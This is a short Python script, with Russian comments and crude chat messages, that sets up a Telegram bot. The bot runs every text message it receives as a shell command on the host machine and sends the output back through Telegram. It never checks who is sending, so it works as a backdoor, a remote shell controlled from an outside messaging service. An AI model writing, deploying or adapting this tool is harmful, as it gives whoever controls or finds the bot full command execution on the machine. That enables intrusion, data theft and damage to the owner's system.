from subprocess import check_output
import telebot
import time
print("и привет программма скоро активируется ожидайте......")
#сюда токен 
bot = telebot.TeleBot("")
@bot.message_handler(commands=['start'])
def start_message(message):
  bot.send_message(message.chat.id,"Привет я приконектился начнем хуйню")
@bot.message_handler(content_types=["text"])
def main(message):
   if (message.chat.id):
      comand = message.text  
      try: 
         bot.send_message(message.chat.id, check_output(comand, shell = True))
      except:
         bot.send_message(message.chat.id, "пиши команду ") 
if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(10)
